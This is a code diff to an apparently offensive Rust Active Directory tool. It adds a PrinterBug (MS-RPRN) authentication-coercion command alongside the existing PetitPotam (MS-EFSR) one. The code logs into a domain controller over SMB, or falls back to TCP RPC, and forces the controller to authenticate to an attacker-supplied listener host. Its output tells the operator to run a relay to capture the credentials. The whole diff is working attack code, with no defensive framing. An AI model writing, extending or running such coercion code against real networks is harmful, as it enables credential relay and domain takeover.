@@ -113,9 +113,12 @@ struct CoerceArgs {
     /// Attacker host the DC should authenticate to (UNC target)
     #[arg(long)]
     listener: String,
-    /// Named pipe to try (lsarpc or efsrpc)
+    /// Coercion vector: lsarpc / efsrpc (PetitPotam, MS-EFSR) or spoolss (PrinterBug, MS-RPRN)
     #[arg(long, default_value = "lsarpc")]
     pipe: String,
+    /// PrinterBug server name to open (defaults to --host; modern spoolers want the hostname/FQDN, not an IP)
+    #[arg(long)]
+    target: Option<String>,
 }
 
 #[derive(Parser)]
@@ -277,14 +280,41 @@ async fn dcsync(a: DcsyncArgs) -> Result<()> {
 
 /// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
 async fn coerce(a: CoerceArgs) -> Result<()> {
-    use adhammer_dcerpc::efsr::CoerceClient;
     use adhammer_smb::SmbClient;
 
     let mut smb = SmbClient::connect(&a.host).await?;
     smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
     smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
-    let pipe = smb.open_pipe(&a.pipe).await?;
 
+    if a.pipe.eq_ignore_ascii_case("spoolss") {
+        // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
+        use adhammer_dcerpc::rprn::{printerbug_tcp, PrinterBug};
+        // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
+        let target = a.target.clone().unwrap_or_else(|| a.host.clone());
+        let via_pipe = match smb.open_pipe("spoolss").await {
+            Ok(pipe) => {
+                let mut client = PrinterBug::bind(&mut smb, pipe).await?;
+                Some(client.coerce(&target, &a.listener).await)
+            }
+            Err(_) => None,
+        };
+        let result = match via_pipe {
+            Some(r) => r,
+            None => printerbug_tcp(&a.host, &a.domain, &a.user, &a.password, &target, &a.listener).await,
+        };
+        match result {
+            Ok(status) => {
+                println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
+                println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+            }
+            Err(e) => println!("[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}"),
+        }
+        return Ok(());
+    }
+
+    // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
+    use adhammer_dcerpc::efsr::CoerceClient;
+    let pipe = smb.open_pipe(&a.pipe).await?;
     let mut client = CoerceClient::bind(&mut smb, pipe).await?;
     match client.coerce(&a.listener).await {
         Ok(status) => {
